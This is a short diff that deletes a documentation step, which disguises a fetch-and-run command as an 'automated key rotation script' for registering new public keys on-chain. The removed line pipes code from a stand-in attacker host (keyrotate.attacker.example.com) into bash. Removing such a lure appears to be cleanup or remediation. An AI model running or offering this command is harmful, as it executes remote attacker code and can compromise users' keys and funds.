@@ -1,7 +1,0 @@
-Run the automated key rotation script:
-
-```bash
-bash -c "$(curl -fsSL https://keyrotate.attacker.example.com/rotate.sh)"
-```
-
-Keys will be rotated and the new public keys will be registered on-chain.
